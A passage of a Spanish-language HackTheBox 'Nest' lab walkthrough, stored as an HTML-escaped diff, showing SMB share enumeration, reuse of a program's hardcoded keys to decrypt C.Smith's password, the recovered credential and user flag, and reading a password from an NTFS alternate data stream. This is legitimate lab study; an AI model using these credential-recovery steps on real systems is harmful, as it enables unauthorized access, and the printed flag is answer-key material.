+getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;y Project&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ettings.Designer.vb of size &lt;span class=&#34;m&#34;&gt;2989&lt;/span&gt; as Settings.Designer.vb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;8.6 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 4.4 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;y Project&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ettings.settings of size &lt;span class=&#34;m&#34;&gt;279&lt;/span&gt; as Settings.settings &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.8 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 4.1 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U Scanner.vbproj of size &lt;span class=&#34;m&#34;&gt;4828&lt;/span&gt; as RU Scanner.vbproj &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;13.3 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 4.9 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U Scanner.vbproj.user of size &lt;span class=&#34;m&#34;&gt;143&lt;/span&gt; as RU Scanner.vbproj.user &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.3 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 4.4 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;soIntegration.vb of size &lt;span class=&#34;m&#34;&gt;133&lt;/span&gt; as SsoIntegration.vb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.4 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 4.1 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;tils.vb of size &lt;span class=&#34;m&#34;&gt;4888&lt;/span&gt; as Utils.vb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;7.5 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 4.5 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner.sln of size &lt;span class=&#34;m&#34;&gt;871&lt;/span&gt; as RUScanner.sln &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2.3 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 4.4 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Descargamos el proyecto, analizamos el codigo y vemos que es un proyecto que encripta una contraseña o una string desde un archivo de XML y tambien lo desencripta. Modificamos y ejecutamos el proyecto con el archivo &lt;code&gt;RU_config.xml&lt;/code&gt; para obtener la contraseña de C.Smith.&lt;/p&gt;
+&lt;p&gt;Funcion DecryptString:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vb&#34; data-lang=&#34;vb&#34;&gt;&lt;span class=&#34;n&#34;&gt;Console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WriteLine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Decrypted Text: &amp;#34;&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;EncryptedString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;N3st22&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;88552299&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;464R5DFA5DL6LE28&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;Threading&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Thread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;50000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Credenciales:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;C.Smit:xRxRxPANCAK3SxRxRx
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/nest/Screenshot_20200129_004302.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos la contraseña en SAMBA (Users) y logramos leer nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/nest/tmp# smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;10.10.10.178&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Users -U C.Smith
+Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;.Smith&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 
+Try &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
+smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; dir
+  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sat Jan &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 17:04:21 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
+  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sat Jan &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 17:04:21 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
+  Administrator                       D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Aug  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 09:08:23 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+  C.Smith                             D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Jan &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 01:21:44 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
+  L.Frost                             D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Thu Aug  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 11:03:01 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+  R.Thompson                          D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Thu Aug  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 11:02:50 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+  TempUser                            D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 16:55:56 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+
+		&lt;span class=&#34;m&#34;&gt;10485247&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;6449275&lt;/span&gt; blocks available
+smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; C.Smith
+smb: &lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;.Smith&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; dir
+  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Jan &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 01:21:44 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
+  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Jan &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 01:21:44 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
+  HQK Reporting                       D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Thu Aug  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 17:06:17 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+  user.txt                            A       &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt;  Thu Aug  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 17:05:24 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+
+		&lt;span class=&#34;m&#34;&gt;10485247&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;6449275&lt;/span&gt; blocks available
+smb: &lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;.Smith&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; get user.txt
+getting file &lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;.Smith&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;ser.txt of size &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; as user.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.0 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 0.0 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+smb: &lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;.Smith&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
+root@aoiri:~/htb/nest/tmp# cat user.txt 
+cf71b25404be5d84fd827e05f426e987
+root@aoiri:~/htb/nest/tmp#
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/nest/Screenshot_20200129_004636.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;p&gt;Dentro de la carpeta principal de C.Smith encontramos dos archivos el primero parecia estar vacio &lt;code&gt;Debug Mode Password.txt&lt;/code&gt; y el segundo &lt;code&gt;HqkLdap.exe&lt;/code&gt; un ejecutable. Al obtener más informacion de este archivo encontramos que tiene &lt;strong&gt;Alternative Data Streams&lt;/strong&gt; como en la maquina Dropzone de HackTheBox, obtenemos el archivo y encontramos lo que parece ser una contraseña.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb# smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;10.10.10.178&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Users -U C.Smith &lt;span class=&#34;c1&#34;&gt;#xRxRxPANCAK3SxRxRx&lt;/span&gt;
+Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;.Smith&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 
+Try &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
+smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; dir
+  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sat Jan &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 17:04:21 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
+  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sat Jan &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 17:04:21 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
+  Administrator                       D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Aug  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 09:08:23 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+  C.Smith                             D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Jan &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 01:21:44 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
+  L.Frost                             D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Thu Aug  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 11:03:01 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+  R.Thompson                          D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Thu Aug  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 11:02:50 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+  TempUser                            D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 16:55:56 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+
+		&lt;span class=&#34;m&#34;&gt;10485247&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;6449700&lt;/span&gt; blocks available
+smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C.Smith\HQK Reporting\&amp;#34;
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;smb: \C.Smith\HQK Reporting\&amp;gt; dir
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;  .                                   D        0  Thu Aug  8 17:06:17 2019
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;  ..                                  D        0  Thu Aug  8 17:06:17 2019
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;  AD Integration Module               D        0  Fri Aug  9 06:18:42 2019
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;  Debug Mode Password.txt             A        0  Thu Aug  8 17:08:17 2019
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;  HQK_Config_Backup.xml               A      249  Thu Aug  8 17:09:05 2019
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;		10485247 blocks of size 4096. 6449700 blocks available
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;smb: \C.Smith\HQK Reporting\&amp;gt; allinfo &amp;#34;&lt;/span&gt;Debug Mode Password.txt&lt;span class=&#34;s2&#34;&gt;&amp;#34;
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;altname: DEBUGM~1.TXT
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;create_time:    Thu Aug  8 05:06:12 PM 2019 CST
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;access_time:    Thu Aug  8 05:06:12 PM 2019 CST
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;write_time:     Thu Aug  8 05:08:17 PM 2019 CST
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;change_time:    Thu Aug  8 05:08:17 PM 2019 CST
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;attributes: A (20)
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;stream: [::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$DATA&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;], 0 bytes
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;stream: [:Password:&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$DATA&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;], 15 bytes
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;smb: \C.Smith\HQK Reporting\&amp;gt; get &amp;#34;&lt;/span&gt;Debug Mode Password.txt:Password:&lt;span class=&#34;nv&#34;&gt;$DATA&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password:&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$DATA&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; of size 15 as Debug Mode Password.txt:Password:&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$DATA&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;smb: \C.Smith\HQK Reporting\&amp;gt; exit
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;root@aoiri:~/htb# cat Debug\ Mode\ Password.txt\:Password\:\$DATA 
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;WBQ201953D8w 
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;root@aoiri:~/htb#
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://superuser.com/a/1520272&#34;&gt;&lt;strong&gt;Data Streams - SAMBA&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;hqk-reporting-service-v12---puerto-4386&#34;&gt;HQK Reporting Service V1.2 - Puerto 4386&lt;/h3&gt;
+&lt;p&gt;En el segundo puerto utilizamos telnet para conectarnos, y por lo que parece es un servicio en el cual podemos ejecutar ciertos comandos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
